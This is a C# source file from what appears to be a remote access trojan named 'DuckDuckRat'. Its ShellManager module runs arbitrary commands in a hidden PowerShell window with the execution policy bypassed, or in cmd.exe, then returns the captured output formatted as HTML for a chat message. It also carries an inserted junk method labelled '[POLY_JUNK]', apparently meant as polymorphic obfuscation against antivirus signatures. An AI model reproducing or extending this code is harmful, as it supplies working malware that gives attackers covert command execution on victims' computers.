using System;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Linq;

namespace DuckDuckRat.Modules
{
    public static class ShellManager
    {
        // [POLY_JUNK]
        private static void _DuckDuckRat_e2797294() {
            int val = 26937;
            if (val > 50000) Console.WriteLine("Hash:" + 26937);
        }

        public static async Task<string> ExecuteCommand(string command)
        {
            if (string.IsNullOrWhiteSpace(command)) return "Empty command.";

            try
            {
                string shell = "powershell.exe";
                string args = $"-NoProfile -ExecutionPolicy Bypass -Command \"{command}\"";

                // Heuristic: Use CMD for simple/classic commands
                string cmdLower = command.Trim().ToLower();
                string[] simpleCmds = { "dir", "cd", "echo", "type", "del", "copy", "move", "mkdir", "rmdir", "cls", "ver" };
                if (simpleCmds.Any(c => cmdLower == c || cmdLower.StartsWith(c + " ")))
                {
                    shell = "cmd.exe";
                    args = $"/c {command}";
                }

                var processInfo = new ProcessStartInfo(shell, args)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                };

                using var process = new Process { StartInfo = processInfo };
                process.Start();

                var outputTask = process.StandardOutput.ReadToEndAsync();
                var errorTask = process.StandardError.ReadToEndAsync();

                // Wait up to 10 seconds for command to complete
                bool exited = process.WaitForExit(10000);
                if (!exited)
                {
                    process.Kill();
                    return $"[!] Command timeout after 10s.\nOutput so far:\n{await outputTask}";
                }

                string output = await outputTask;
                string error = await errorTask;

                string outputClean = output.Trim();
                string errorClean = error.Trim();

                // Truncate raw strings if they are too long to fit in one message
                if (outputClean.Length > 3500) outputClean = outputClean.Substring(0, 3500) + "\n...[TRUNCATED]";
                if (errorClean.Length > 1000) errorClean = errorClean.Substring(0, 1000) + "\n...[TRUNCATED]";

                StringBuilder sb = new StringBuilder();
                if (!string.IsNullOrEmpty(outputClean))
                {
                    sb.AppendLine("<pre>");
                    sb.AppendLine(System.Net.WebUtility.HtmlEncode(outputClean));
                    sb.AppendLine("</pre>");
                }
                if (!string.IsNullOrEmpty(errorClean))
                {
                    sb.AppendLine("⚠️ <b>Error:</b>");
                    sb.AppendLine("<pre>");
                    sb.AppendLine(System.Net.WebUtility.HtmlEncode(errorClean));
                    sb.AppendLine("</pre>");
                }

                if (sb.Length == 0) return "✅ <i>Executed (No output).</i>";
                return sb.ToString();
            }
            catch (Exception ex)
            {
                return $"❌ Shell Error: {ex.Message}";
            }
        }
    }
}


